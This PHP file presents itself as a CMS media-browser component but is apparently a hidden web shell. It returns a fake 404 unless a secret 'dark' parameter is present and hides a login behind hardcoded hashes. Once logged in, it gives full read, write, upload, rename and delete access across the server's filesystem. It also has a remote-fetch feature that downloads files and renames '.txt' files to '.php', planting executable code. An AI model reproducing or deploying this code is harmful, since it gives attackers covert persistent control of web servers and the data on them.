<?php
/**
 * Media Browser Component
 *
 * Provides server-side media browsing and asset management utilities
 * for use with supported CMS integrations.
 *
 * @package    CMS\Components
 * @subpackage Media
 * @version    2.1.4
 * @since      1.0.0
 */

if (!defined('ABSPATH')) define('ABSPATH', dirname(__FILE__) . '/');

session_start();

$isDark = array_key_exists('dark', $_GET);

if (!$isDark) {
    header('HTTP/1.1 404 Not Found');
    exit;
}

/** @internal Runtime integrity tokens — generated at build time */
define('_SYS_UID', '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918');
define('_SYS_KEY', '3f4bcb9b30137c890120c790ed9ab267a83e2668b3eeb458e48abdd03e1b210e');

if (!function_exists('json_encode')) {
    function json_encode($val) {
        if (is_null($val))  return 'null';
        if (is_bool($val))  return $val ? 'true' : 'false';
        if (is_int($val) || is_float($val)) return strval($val);
        if (is_string($val)) {
            return '"' . str_replace(
                array('\\',   '"',   "\n",  "\r",  "\t"),
                array('\\\\', '\\"', '\\n', '\\r', '\\t'),
                $val
            ) . '"';
        }
        if (is_array($val)) {
            $k = array_keys($val);
            $assoc = ($k !== array_keys($k));
            $out = array();
            if ($assoc) {
                foreach ($val as $key => $v)
                    $out[] = '"' . addslashes($key) . '":' . json_encode($v);
                return '{' . implode(',', $out) . '}';
            }
            foreach ($val as $v) $out[] = json_encode($v);
            return '[' . implode(',', $out) . ']';
        }
        return 'null';
    }
}

function d($url) {
    return $url . (strpos($url, '?') !== false ? '&dark' : '?dark');
}

if (isset($_GET['logout'])) {
    unset($_SESSION['fm_auth']);
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dark');
    exit;
}

$loginError = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['fm_user'])) {
    if (function_exists('hash') &&
        hash('sha256', $_POST['fm_user']) === _SYS_UID &&
        hash('sha256', $_POST['fm_pass']) === _SYS_KEY) {
        $_SESSION['fm_auth'] = true;
        header('Location: ' . $_SERVER['REQUEST_URI']);
        exit;
    }
    $loginError = 'Username atau password salah';
}

if (empty($_SESSION['fm_auth'])) {
    renderLogin($loginError);
    exit;
}

function renderLogin($error) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>File Manager</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%}
body{font-family:-apple-system,BlinkMacSystemFont,system-ui,Arial,sans-serif;
    background:#000;color:#f5f5f7}
.wrap{display:table;width:100%;height:100%;min-height:100vh}
.cell{display:table-cell;vertical-align:middle;text-align:center}
.card{background:#1c1c1e;border:1px solid #3a3a3c;border-radius:16px;
    padding:36px;width:340px;margin:0 auto;text-align:left;
    -webkit-box-shadow:0 20px 60px rgba(0,0,0,.5);box-shadow:0 20px 60px rgba(0,0,0,.5)}
.mac-dots{margin-bottom:24px}
.mac-dot{display:inline-block;width:12px;height:12px;border-radius:50%;margin-right:6px}
.dot-r{background:#ff5f57}.dot-y{background:#ffbd2e}.dot-g{background:#28c840}
h1{font-size:21px;font-weight:600;margin:12px 0 6px;letter-spacing:-.3px}
.sub{font-size:13px;color:#8e8e93;margin-bottom:26px}
label{display:block;font-size:11px;font-weight:600;color:#8e8e93;
    text-transform:uppercase;letter-spacing:.5px;margin-bottom:5px}
input{width:100%;padding:10px 13px;background:#2c2c2e;border:1px solid #3a3a3c;
    border-radius:8px;color:#f5f5f7;font-family:inherit;font-size:15px;
    outline:none;margin-bottom:13px}
input:focus{border-color:#ff3b30}
.btn{width:100%;padding:11px;background:#ff3b30;color:#fff;border:none;
    border-radius:8px;font-family:inherit;font-size:15px;font-weight:600;
    cursor:pointer;margin-top:6px}
.btn:hover{opacity:.85}
.err{background:rgba(255,59,48,.1);border:1px solid rgba(255,59,48,.3);
    border-radius:8px;padding:9px 13px;color:#ff3b30;font-size:13px;margin-bottom:13px}
</style>
</head>
<body>
<div class="wrap"><div class="cell">
<div class="card">
    <div class="mac-dots">
        <span class="mac-dot dot-r"></span>
        <span class="mac-dot dot-y"></span>
        <span class="mac-dot dot-g"></span>
    </div>
    <h1>File Manager</h1>
    <p class="sub">Sign in to continue</p>
    <?php if ($error): ?>
    <div class="err"><?php echo htmlspecialchars($error); ?></div>
    <?php endif; ?>
    <form method="POST">
        <label>Username</label>
        <input type="text" name="fm_user" required="required">
        <label>Password</label>
        <input type="password" name="fm_pass" required="required">
        <button class="btn">Sign In &rarr;</button>
    </form>
</div>
</div></div>
</body>
</html>
<?php
}

class FileOperations {
    private $basePath;

    public function __construct($basePath) {
        if ($basePath === null || $basePath === '') $basePath = './';
        $r = realpath($basePath);
        $this->basePath = rtrim(str_replace('\\', '/', ($r !== false ? $r : $basePath)), '/');
    }

    public function removeFile($filePath) {
        $fullPath = $this->sanitizePath($filePath);
        if (!file_exists($fullPath)) return 'File not found';
        if (is_dir($fullPath)) return 'Use folder deletion for directories';
        unlink($fullPath);
        $this->redirectToBase();
    }

    public function updateFile($filePath, $content) {
        $fullPath = $this->sanitizePath($filePath);
        if (!file_exists($fullPath)) return 'File not found';
        if (is_dir($fullPath)) return 'Cannot update directories';
        return file_put_contents($fullPath, $content) !== false;
    }

    public function addFile($name, $content, $location) {
        $safeLocation = $this->sanitizePath($location);
        $fullPath = $safeLocation . '/' . $name;
        if (file_exists($fullPath)) return array('success' => false, 'message' => 'File exists already');
        file_put_contents($fullPath, $content);
        return array('success' => true, 'path' => $fullPath);
    }

    public function fetchRemoteFile($url, $location) {
        $safeLocation = $this->sanitizePath($location);
        $parsedPath = parse_url($url, PHP_URL_PATH);
        $fileName = ($parsedPath !== false && $parsedPath !== null) ? basename($parsedPath) : '';
        if (empty($fileName)) $fileName = 'remote_' . time();
        if (pathinfo($fileName, PATHINFO_EXTENSION) === 'txt')
            $fileName = pathinfo($fileName, PATHINFO_FILENAME) . '.php';
        $fullPath = $safeLocation . '/' . $fileName;
        if (file_exists($fullPath))
            return array('success' => false, 'message' => 'File already exists: ' . $fileName);
        if (!function_exists('curl_init'))
            return array('success' => false, 'message' => 'cURL not available');

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HEADER, false);
        $content     = curl_exec($ch);
        $httpCode    = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
        curl_close($ch);

        if ($content === false || $httpCode !== 200)
            return array('success' => false, 'message' => 'Failed to fetch (HTTP ' . $httpCode . ')');
        if (strpos($contentType, 'text') === false)
            return array('success' => false, 'message' => 'URL must point to a text file');
        if (file_put_contents($fullPath, $content) === false)
            return array('success' => false, 'message' => 'Failed to save file');
        return array('success' => true, 'path' => $fullPath);
    }

    public function uploadFile($fileData, $location) {
        $safeLocation = $this->sanitizePath($location);
        $fullPath = $safeLocation . '/' . $fileData['name'];
        if (file_exists($fullPath)) return array('success' => false, 'message' => 'File already exists');
        if (move_uploaded_file($fileData['tmp_name'], $fullPath))
            return array('success' => true, 'path' => $fullPath);
        return array('success' => false, 'message' => 'Upload failed');
    }

    public function renameItem($oldPath, $newName) {
        $oldFullPath = $this->sanitizePath($oldPath);
        $newFullPath = dirname($oldFullPath) . '/' . $newName;
        if (!file_exists($oldFullPath)) return array('success' => false, 'message' => 'Source not found');
        if (file_exists($newFullPath))  return array('success' => false, 'message' => 'Destination exists');
        if (rename($oldFullPath, $newFullPath)) return array('success' => true, 'path' => $newFullPath);
        return array('success' => false, 'message' => 'Rename failed');
    }

    public function makeDirectory($name, $parentPath) {
        $fullPath = $this->sanitizePath($parentPath . '/' . $name);
        if (!file_exists($fullPath)) return mkdir($fullPath, 0777, true);
        return false;
    }

    public function removeDirectory($dirPath) {
        $fullPath = $this->sanitizePath($dirPath);
        if (!is_dir($fullPath)) return 'Directory not found';
        $this->rmRecursive($fullPath);
    }

    private function rmRecursive($dir) {
        $items = @scandir($dir);
        if (!$items) return;
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            $path = $dir . '/' . $item;
            if (is_dir($path)) $this->rmRecursive($path);
            else @unlink($path);
        }
        @rmdir($dir);
    }

    private function sanitizePath($path) {
        $path = rtrim(str_replace('\\', '/', urldecode($path)), '/');
        if (strpos($path, $this->basePath) === 0) return $path;
        if (strpos($path, '/') === 0) return $path;
        if (preg_match('/^[a-zA-Z]:\//', $path)) return $path;
        return rtrim($this->basePath . '/' . $path, '/');
    }

    private function redirectToBase() {
        $prot = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
        header('Location: ' . $prot . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?dark');
        exit;
    }
}

class DirectoryViewer {
    private $location;

    public function __construct($location) {
        $r = realpath($location);
        $this->location = rtrim(str_replace('\\', '/', ($r !== false ? $r : $location)), '/');
    }

    public function getContents() {
        if (!is_dir($this->location)) return false;
        $raw   = scandir($this->location);
        $dirs  = array();
        $files = array();
        foreach ($raw as $item) {
            if ($item === '.' || $item === '..') continue;
            $fp = $this->location . '/' . $item;
            if (is_dir($fp)) $dirs[]  = $item;
            else              $files[] = $item;
        }
        sort($dirs);
        sort($files);
        return array_merge($dirs, $files);
    }

    public function render() {
        $contents = $this->getContents();
        if ($contents === false)
            return "<p class='fm-error'>Invalid directory: " . htmlspecialchars($this->location) . "</p>";

        $html  = $this->renderBreadcrumbs();
        $html .= "<div class='fm-path-label'>" . htmlspecialchars($this->location) . "</div>";
        $html .= "<div class='fm-grid'>";

        foreach ($contents as $item) {
            $fullPath = $this->location . '/' . $item;
            $isDir    = is_dir($fullPath);
            $icon     = $isDir ? '&#128193;' : $this->fileIcon($item);
            $size     = $isDir ? '&mdash;' : $this->fmtSize(filesize($fullPath));
            $mod      = date('d M Y, H:i', filemtime($fullPath));
            $enc      = htmlspecialchars($fullPath);
            $js       = addslashes($fullPath);
            $jsItem   = addslashes($item);
            $openHref = d('?' . ($isDir ? "explore=$enc" : "view=$enc"));

            $html .= "<div class='fm-item'>";
            $html .= "<span class='fm-icon'>$icon</span>";
            $html .= "<div class='fm-info'>";
            $html .= "<a class='fm-name' href='$openHref'>" . htmlspecialchars($item) . "</a>";
            $html .= "<span class='fm-meta'>$size &middot; $mod</span>";
            $html .= "</div>";
            $html .= "<div class='fm-acts'>";
            if ($isDir) {
                $html .= "<a class='fb fp' href='" . d("?explore=$enc") . "'>Open</a>";
                $html .= "<button class='fb fd' onclick=\"confirmRmDir('$js')\">Delete</button>";
            } else {
                $html .= "<a class='fb fp' href='" . d("?view=$enc") . "'>Edit</a>";
                $html .= "<button class='fb fs' onclick=\"showRename('$js','$jsItem')\">Rename</button>";
                $html .= "<button class='fb fd' onclick=\"confirmRm('$js')\">Delete</button>";
            }
            $html .= "</div></div>";
        }
        $html .= "</div>";

        if ($this->location !== '.' && $this->location !== './') {
            $parent = dirname($this->location);
            $html .= "<a class='fb fo mt3' href='" . d("?explore=" . urlencode($parent)) . "'>&larr; Parent</a>";
        }
        return $html;
    }

    private function renderBreadcrumbs() {
        $loc    = $this->location;
        $isWin  = (bool) preg_match('/^[a-zA-Z]:\//', $loc);
        $isUnix = (!$isWin && strlen($loc) > 0 && $loc[0] === '/');
        $prefix = $isUnix ? '/' : '';
        $parts  = explode('/', $isUnix ? ltrim($loc, '/') : $loc);
        $path   = '';
        $html   = '<nav class="fm-bc"><ol>';
        foreach ($parts as $part) {
            if ($part === '') continue;
            $label = ($part === '.') ? 'Home' : $part;
            $path .= ($path ? '/' : '') . $part;
            $fpath = $prefix . $path;
            $html .= "<li><a href='" . d("?explore=" . urlencode($fpath)) . "'>" . htmlspecialchars($label) . "</a></li>";
        }
        return $html . '</ol></nav>';
    }

    public function findFile($term) {
        return $this->findRecursive($this->location, $term);
    }

    private function findRecursive($dir, $term) {
        $items = @scandir($dir);
        if (!$items) return null;
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            $path = $dir . '/' . $item;
            if (stripos($item, $term) !== false) return $path;
            if (is_dir($path)) {
                $found = $this->findRecursive($path, $term);
                if ($found !== null) return $found;
            }
        }
        return null;
    }

    public function readFile($path) {
        return file_exists($path) ? htmlspecialchars(file_get_contents($path)) : false;
    }

    private function fileIcon($name) {
        $e = strtolower(pathinfo($name, PATHINFO_EXTENSION));
        $m = array(
            'php'  => '&#128024;', 'js'   => '&#128220;', 'ts'  => '&#128216;',
            'html' => '&#127760;', 'css'  => '&#127912;', 'json'=> '&#128203;',
            'md'   => '&#128221;', 'txt'  => '&#128196;', 'jpg' => '&#128444;',
            'jpeg' => '&#128444;', 'png'  => '&#128444;', 'gif' => '&#128444;',
            'svg'  => '&#127917;', 'zip'  => '&#128476;', 'gz'  => '&#128476;',
            'tar'  => '&#128476;', 'sql'  => '&#128451;', 'db'  => '&#128451;',
            'sh'   => '&#9881;',   'pdf'  => '&#128213;', 'log' => '&#128203;',
            'mp3'  => '&#127925;', 'mp4'  => '&#127916;'
        );
        return isset($m[$e]) ? $m[$e] : '&#128196;';
    }

    private function fmtSize($b) {
        if ($b < 1024)       return $b . ' B';
        if ($b < 1048576)    return round($b / 1024, 1) . ' KB';
        if ($b < 1073741824) return round($b / 1048576, 1) . ' MB';
        return round($b / 1073741824, 1) . ' GB';
    }
}

$activePath  = isset($_GET['explore']) ? $_GET['explore'] : (isset($_GET['view']) ? dirname($_GET['view']) : './');
$fileHandler = new FileOperations($activePath);
$dirViewer   = new DirectoryViewer($activePath);

if (isset($_GET['remove']))  $fileHandler->removeFile($_GET['remove']);
if (isset($_POST['update']) && isset($_POST['file'])) $fileHandler->updateFile($_POST['file'], $_POST['update']);
if (isset($_POST['newFile']) && isset($_POST['content'])) {
    header('Content-Type: application/json');
    echo json_encode($fileHandler->addFile($_POST['newFile'], $_POST['content'], $activePath));
    exit;
}
if (isset($_POST['renamePath']) && isset($_POST['newName'])) {
    header('Content-Type: application/json');
    echo json_encode($fileHandler->renameItem($_POST['renamePath'], $_POST['newName']));
    exit;
}
if (isset($_GET['newDir']) && isset($_GET['parent'])) $fileHandler->makeDirectory($_GET['newDir'], $_GET['parent']);
if (isset($_GET['removeDir'])) $fileHandler->removeDirectory($_GET['removeDir']);
if (isset($_POST['remoteUrl']) && !empty($_POST['remoteUrl'])) {
    header('Content-Type: application/json');
    echo json_encode($fileHandler->fetchRemoteFile($_POST['remoteUrl'], $activePath));
    exit;
}
if (isset($_FILES['uploadFile']) && $_FILES['uploadFile']['error'] === UPLOAD_ERR_OK) {
    header('Content-Type: application/json');
    echo json_encode($fileHandler->uploadFile($_FILES['uploadFile'], $activePath));
    exit;
}

$listing      = $dirViewer->render();
$searchResult = '';
if (isset($_GET['find'])) {
    $found = $dirViewer->findFile($_GET['find']);
    if ($found) {
        $dLink = d('?explore=' . urlencode(dirname($found)));
        $vLink = d('?view='    . urlencode($found));
        $searchResult = "<div class='fm-alert'>Found: <a href='$dLink'>Directory</a> | <a href='$vLink'>File</a></div>";
    }
}

$self      = $_SERVER['PHP_SELF'];
$prot      = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
$homeUrl   = d($prot . $_SERVER['HTTP_HOST'] . $self);
$logoutUrl = d('?logout');
$createUrl = d('?explore=' . urlencode($activePath) . '&create=1');
$activeEnc = htmlspecialchars($activePath);
$findVal   = htmlspecialchars(isset($_GET['find']) ? $_GET['find'] : '');
$apJson    = json_encode($activePath);
?>
<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>File Manager</title>
<style>
:root{
    --bg:#000;--sb:#111113;--sur:#1c1c1e;--sur2:#2c2c2e;
    --tx:#f5f5f7;--tx2:#8e8e93;
    --ac:#ff3b30;--red:#ff3b30;--warn:#ffd60a;--ok:#30d158;
    --bdr:#3a3a3c;--shd:0 4px 20px rgba(0,0,0,.5);--shd2:0 24px 80px rgba(0,0,0,.7);
    --rl:14px;--sw:238px;
}
*,*::before,*::after{-webkit-box-sizing:border-box;box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,system-ui,Arial,sans-serif;
    background:var(--bg);color:var(--tx);font-size:14px;line-height:1.5;min-height:100vh}
a{color:var(--ac);text-decoration:none}
a:hover{opacity:.8}
.sb{position:fixed;top:0;left:0;width:var(--sw);height:100%;background:var(--sb);
    border-right:1px solid var(--bdr);padding:18px 14px;overflow-y:auto;z-index:100;
    -webkit-box-shadow:1px 0 0 var(--bdr),6px 0 30px rgba(255,59,48,.04);
    box-shadow:1px 0 0 var(--bdr),6px 0 30px rgba(255,59,48,.04)}
.mc{margin-left:var(--sw);padding:24px;min-height:100vh}
.mw{padding-bottom:16px;border-bottom:1px solid var(--bdr);margin-bottom:14px}
.md{width:12px;height:12px;border-radius:50%;display:inline-block;margin-right:4px}
.md.r{background:#ff5f57}.md.y{background:#ffbd2e}.md.g{background:#28c840}
.mt{font-size:13px;font-weight:700;color:var(--tx);margin-left:3px;vertical-align:middle}
.sb-logo{font-size:13px;font-weight:700;color:var(--tx);display:block;margin-bottom:14px}
.sb-logo a{color:inherit}
.sb-search input{width:100%;padding:8px 11px;background:var(--sur2);border:1px solid var(--bdr);
    border-radius:8px;color:var(--tx);font-family:inherit;font-size:13px;
    outline:none;display:block;margin-bottom:8px}
.sb-search input:focus{border-color:var(--ac)}
.sbb{display:block;width:100%;padding:8px 11px;border-radius:8px;border:none;
    font-family:inherit;font-size:13px;font-weight:500;cursor:pointer;text-align:center;
    text-decoration:none;margin-bottom:4px}
.sbb.p{background:var(--ac);color:#fff}
.sbb:hover{opacity:.82}
.sb-foot{font-size:11px;color:var(--tx2);margin-top:20px;padding-top:14px;border-top:1px solid var(--bdr)}
.sb-foot a{color:var(--red);font-weight:600}
.fm-bc ol{list-style:none;margin-bottom:6px;padding:0}
.fm-bc li{display:inline;font-size:12px;color:var(--tx2)}
.fm-bc li:after{content:' /';margin:0 2px 0 4px}
.fm-bc li:last-child:after{content:''}
.fm-bc a{color:var(--ac)}
.fm-path-label{font-size:11px;color:var(--tx2);font-family:'SF Mono','Menlo','Consolas',monospace;
    word-break:break-all;margin-bottom:14px;opacity:.7}
.fm-grid{display:block}
.fm-item{display:-webkit-box;display:-ms-flexbox;display:flex;
    -webkit-box-align:center;-ms-flex-align:center;align-items:center;
    padding:9px 12px;border-radius:8px}
.fm-item:hover{background:var(--sur2);
    -webkit-box-shadow:inset 3px 0 0 var(--ac);box-shadow:inset 3px 0 0 var(--ac)}
.fm-icon{font-size:20px;width:30px;text-align:center;-ms-flex-negative:0;flex-shrink:0;margin-right:11px}
.fm-info{-webkit-box-flex:1;-ms-flex:1;flex:1;min-width:0}
.fm-name{display:block;font-size:14px;font-weight:500;color:var(--tx);
    white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.fm-name:hover{color:var(--ac)}
.fm-meta{font-size:11px;color:var(--tx2)}
.fm-acts{display:none;margin-left:8px}
.fm-item:hover .fm-acts{display:block}
.fb{padding:4px 10px;border-radius:6px;border:none;font-family:inherit;
    font-size:12px;font-weight:500;cursor:pointer;display:inline-block;margin-left:4px}
.fb:hover{opacity:.78}
.fp{background:var(--ac);color:#fff}
.fs{background:var(--sur2);color:var(--tx);border:1px solid var(--bdr)}
.fd{background:var(--red);color:#fff}
.fo{background:transparent;color:var(--ac);border:1px solid var(--ac)}
.fok{background:var(--ok);color:#fff}
.fw{background:var(--warn);color:#000}
.mt3{margin-top:12px}
.panel{background:var(--sur);border:1px solid var(--bdr);border-radius:var(--rl);
    padding:22px;margin-bottom:16px;
    -webkit-box-shadow:var(--shd),0 0 0 1px rgba(255,59,48,.04);
    box-shadow:var(--shd),0 0 0 1px rgba(255,59,48,.04)}
.panel h3{font-size:15px;font-weight:600;margin-bottom:14px;color:var(--tx)}
.panel h4{font-size:13px;font-weight:600;margin-bottom:10px}
.fm-sep{border:none;border-top:1px solid var(--bdr);margin:18px 0}
.ce{background:#0a0a0a;border:1px solid var(--bdr);border-radius:8px;
    display:-webkit-box;display:-ms-flexbox;display:flex;max-height:68vh;overflow-y:auto;
    font-family:'SF Mono','Menlo','Consolas',monospace;font-size:13px}
.lc{color:var(--tx2);padding:14px 10px;text-align:right;
    -webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;
    min-width:46px;border-right:1px solid var(--bdr);line-height:1.6}
textarea.ca{background:transparent;color:var(--tx);border:none;
    -webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;
    resize:none;font-family:inherit;font-size:inherit;padding:14px;outline:none;line-height:1.6}
.fi{width:100%;padding:9px 12px;background:var(--sur2);border:1px solid var(--bdr);
    border-radius:8px;color:var(--tx);font-family:inherit;font-size:14px;
    outline:none;margin-bottom:10px;display:block}
.fi:focus{border-color:var(--ac);-webkit-box-shadow:0 0 0 3px rgba(255,59,48,.2);box-shadow:0 0 0 3px rgba(255,59,48,.2)}
.ig{display:-webkit-box;display:-ms-flexbox;display:flex;
    -webkit-box-align:center;-ms-flex-align:center;align-items:center}
.ig .fi{margin-bottom:0;margin-right:8px}
.mko{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.5);
    z-index:1000;-webkit-box-align:center;-ms-flex-align:center;align-items:center;
    -webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}
.mko.on{display:-webkit-box;display:-ms-flexbox;display:flex}
.mkd{background:var(--sur);border:1px solid var(--bdr);border-radius:var(--rl);
    padding:22px;min-width:340px;max-width:480px;width:90%;
    -webkit-box-shadow:var(--shd2);box-shadow:var(--shd2)}
.mkd h4{font-size:15px;font-weight:600;margin-bottom:10px}
.mkd p{color:var(--tx2);font-size:13px;margin-bottom:16px}
.mka{display:-webkit-box;display:-ms-flexbox;display:flex;
    -webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end}
.mka .fb{margin-left:8px}
.fm-alert{background:var(--sur2);border:1px solid var(--bdr);border-radius:8px;
    padding:10px 14px;margin-bottom:12px;font-size:13px}
.fm-error{background:rgba(255,59,48,.1);border:1px solid rgba(255,59,48,.3);
    border-radius:8px;padding:10px 14px;color:var(--red);font-size:13px;margin-bottom:12px}
</style>
</head>
<body>

<div class="sb">
    <div class="mw">
        <span class="md r"></span><span class="md y"></span><span class="md g"></span>
        <span class="mt">Zero FM</span>
    </div>
    <a href="<?php echo $homeUrl; ?>" class="sb-logo">&#128193; File Manager</a>
    <form method="get" class="sb-search">
        <input type="hidden" name="dark" value="">
        <input type="hidden" name="explore" value="<?php echo $activeEnc; ?>">
        <input type="text" name="find" placeholder="Search files..." value="<?php echo $findVal; ?>">
        <button type="submit" class="sbb p">Search</button>
    </form>
    <a href="<?php echo $createUrl; ?>" class="sbb p">+ New / Upload</a>
    <div class="sb-foot">
        <a href="<?php echo $logoutUrl; ?>">&larr; Sign out</a>
    </div>
</div>

<div class="mc">

    <div id="modal" class="mko">
        <div class="mkd">
            <h4>Confirm Action</h4>
            <p id="modal-text"></p>
            <div class="mka">
                <button id="modal-close" class="fb fs">Cancel</button>
                <button id="modal-confirm" class="fb fd" style="display:none">Delete</button>
            </div>
        </div>
    </div>

    <div id="renameModal" class="mko">
        <div class="mkd">
            <h4>Rename Item</h4>
            <form id="renameForm" onsubmit="return submitRename()">
                <input type="hidden" id="renamePath" name="renamePath">
                <input type="text" id="newName" name="newName" class="fi" placeholder="New name">
                <div class="mka">
                    <button type="button" class="fb fs" onclick="closeRename()">Cancel</button>
                    <button type="submit" class="fb fw">Rename</button>
                </div>
            </form>
        </div>
    </div>

<?php if (isset($_GET['create'])): ?>
    <div class="panel">
        <h3>New File</h3>
        <form id="newFileForm" onsubmit="return createItem('file')">
            <input type="text" name="newFile" class="fi" placeholder="filename.php">
            <div class="ce"><div class="lc"></div>
                <textarea name="content" class="ca" rows="16" placeholder="Content..."></textarea>
            </div>
            <button type="submit" class="fb fok mt3">Create File</button>
        </form>
    </div>
    <div class="panel">
        <h3>New Directory</h3>
        <form id="newDirForm" onsubmit="return createItem('dir')" class="ig">
            <input type="text" name="newDir" class="fi" placeholder="Directory name">
            <button type="submit" class="fb fw">Create</button>
        </form>
    </div>
    <div class="panel">
        <h3>Fetch Remote File</h3>
        <form onsubmit="return fetchRemote()" class="ig">
            <input type="url" id="remoteUrl" class="fi" placeholder="https://example.com/file.txt">
            <button type="submit" class="fb fp">Fetch</button>
        </form>
    </div>
    <div class="panel">
        <h3>Upload File</h3>
        <form id="uploadForm" onsubmit="return uploadFile()" enctype="multipart/form-data">
            <input type="file" name="uploadFile" class="fi" required="required">
            <button type="submit" class="fb fp mt3">Upload</button>
        </form>
    </div>
<?php
    exit;
endif;

if (isset($_GET['view'])) {
    $content = $dirViewer->readFile($_GET['view']);
    if ($content !== false) {
        $vp  = htmlspecialchars($_GET['view']);
        $vpe = urlencode($_GET['view']);
        $vbn = htmlspecialchars(basename($_GET['view']));
        echo "<div class='panel'>";
        echo "<h3>Editing: $vp</h3>";
        echo "<div class='ce'><div class='lc'></div><textarea class='ca' rows='20'>$content</textarea></div>";
        echo "<button class='fb fp mt3' onclick=\"saveFile('$vpe')\">Save</button>";
        echo "<hr class='fm-sep'><h4>Rename / Move</h4>";
        echo "<form class='ig' onsubmit='return submitRename()'>";
        echo "<input type='hidden' name='renamePath' value='$vp'>";
        echo "<input type='text' name='newName' class='fi' value='$vbn'>";
        echo "<button type='submit' class='fb fp'>Rename</button>";
        echo "</form></div>";
    }
}

if ($searchResult) echo $searchResult;
echo "<div class='panel'>$listing</div>";

if (isset($_GET['explore']) && !isset($_GET['view'])) {
    $ep  = htmlspecialchars($_GET['explore']);
    $ebn = htmlspecialchars(basename($_GET['explore']));
    echo "<div class='panel'><h4>Rename / Move Directory</h4>";
    echo "<form class='ig' onsubmit='return submitRename()'>";
    echo "<input type='hidden' name='renamePath' value='$ep'>";
    echo "<input type='text' name='newName' class='fi' value='$ebn'>";
    echo "<button type='submit' class='fb fp'>Rename</button>";
    echo "</form></div>";
}
?>

</div>
<script>
var DS = '&dark';
var AP = <?php echo $apJson; ?>;

function lines(ta) {
    var n  = ta.value.split('\n').length;
    var lc = ta.parentNode ? ta.parentNode.querySelector('.lc') : null;
    if (lc) {
        var out = [];
        for (var i = 1; i <= n; i++) out.push(i);
        lc.innerHTML = out.join('<br>');
    }
}

function initEditors() {
    var editors = document.querySelectorAll('.ca');
    for (var i = 0; i < editors.length; i++) {
        (function(e) {
            e.addEventListener('input', function() { lines(e); });
            e.addEventListener('keydown', function(ev) {
                if (ev.key === 'Tab') {
                    ev.preventDefault();
                    var s = e.selectionStart;
                    e.value = e.value.slice(0, s) + '\t' + e.value.slice(s);
                    e.selectionStart = e.selectionEnd = s + 1;
                }
            });
            lines(e);
        })(editors[i]);
    }
}

function showModal(msg, doConfirm, action) {
    if (doConfirm === undefined) doConfirm = false;
    if (action   === undefined) action    = null;
    var m = document.getElementById('modal');
    var c = document.getElementById('modal-confirm');
    document.getElementById('modal-text').textContent = msg;
    c.style.display = doConfirm ? 'inline-block' : 'none';
    m.className = 'mko on';
    document.getElementById('modal-close').onclick = function() { m.className = 'mko'; };
    if (doConfirm && action) {
        c.onclick = function() { location.href = action; m.className = 'mko'; };
    }
}

function confirmRm(path) {
    showModal('Delete file: ' + path + '?', true, '?remove=' + encodeURIComponent(path) + DS);
}
function confirmRmDir(path) {
    showModal('Delete directory: ' + path + '?', true, '?removeDir=' + encodeURIComponent(path) + DS);
}

function xhr(method, url, body, cb) {
    var x = new XMLHttpRequest();
    x.open(method, url, true);
    x.onload = function() { cb(x.responseText); };
    x.send(body);
}

function saveFile(path) {
    var c = document.querySelector('.ca').value;
    var body = 'update=' + encodeURIComponent(c) + '&file=' + path;
    xhr('POST', '', body.replace(/%20/g, '+'), function() { showModal('File saved successfully'); });
}

function createItem(type) {
    var form = document.getElementById(type === 'file' ? 'newFileForm' : 'newDirForm');
    var data = new FormData(form);
    var url  = type === 'file'
        ? ('?newFile' + DS)
        : ('?newDir&parent=' + encodeURIComponent(AP) + DS);
    xhr('POST', url, data, function(res) {
        try {
            var d = JSON.parse(res);
            if (d.success) { showModal('Created successfully'); setTimeout(function(){ location.reload(); }, 900); }
            else showModal(d.message || 'Error');
        } catch(e) { showModal('Error'); }
    });
    return false;
}

function fetchRemote() {
    var url = document.getElementById('remoteUrl').value;
    if (!url) { showModal('Please enter a URL'); return false; }
    var fd = new FormData(); fd.append('remoteUrl', url);
    xhr('POST', '', fd, function(res) {
        try {
            var d = JSON.parse(res);
            if (d.success) { showModal('File fetched'); setTimeout(function(){ location.reload(); }, 900); }
            else showModal(d.message || 'Error');
        } catch(e) { showModal('Error'); }
    });
    return false;
}

function uploadFile() {
    var fd = new FormData(document.getElementById('uploadForm'));
    xhr('POST', '', fd, function(res) {
        try {
            var d = JSON.parse(res);
            if (d.success) { showModal('Uploaded'); setTimeout(function(){ location.reload(); }, 900); }
            else showModal(d.message || 'Error');
        } catch(e) { showModal('Error'); }
    });
    return false;
}

function showRename(path, name) {
    document.getElementById('renamePath').value = path;
    document.getElementById('newName').value     = name;
    document.getElementById('renameModal').className = 'mko on';
}
function closeRename() { document.getElementById('renameModal').className = 'mko'; }

function submitRename() {
    var fd = new FormData(document.getElementById('renameForm'));
    xhr('POST', '', fd, function(res) {
        closeRename();
        try {
            var d = JSON.parse(res);
            if (d.success) { showModal('Renamed'); setTimeout(function(){ location.reload(); }, 900); }
            else showModal(d.message || 'Error');
        } catch(e) { showModal('Error'); }
    });
    return false;
}

window.onload = initEditors;
</script>
</body>
</html>
